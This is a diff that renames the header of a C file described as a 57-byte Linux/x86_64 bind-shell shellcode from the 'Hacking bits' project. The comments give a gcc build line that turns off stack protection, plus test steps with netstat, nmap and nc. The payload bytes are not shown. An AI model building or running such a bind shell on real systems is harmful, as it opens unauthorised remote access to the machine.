@@ -1,6 +1,6 @@
 /*
 
- Tiny Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
+ Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
  Copyright (C) 2013 Geyslan G. Bem, Hacking bits
 
    http://hackingbits.com
@@ -24,16 +24,16 @@
 
 /*
 
-   tiny_shell_bind_tcp_random_port_shellcode_x86_64
+   shell_bind_tcp_random_port_shellcode_x86_64
 
    * 57 bytes
    * null-free
 
 
-   # gcc -m64 -fno-stack-protector -z execstack tiny_shell_bind_tcp_random_port_shellcode_x86_64.c -o tiny_shell_bind_tcp_random_port_shellcode_x86_64
+   # gcc -m64 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode_x86_64.c -o shell_bind_tcp_random_port_shellcode_x86_64
 
    Testing
-   # ./tiny_shell_bind_tcp_random_port_shellcode_x86_64
+   # ./shell_bind_tcp_random_port_shellcode_x86_64
    # netstat -anp | grep shell
    # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
    # nc 127.0.0.1 port
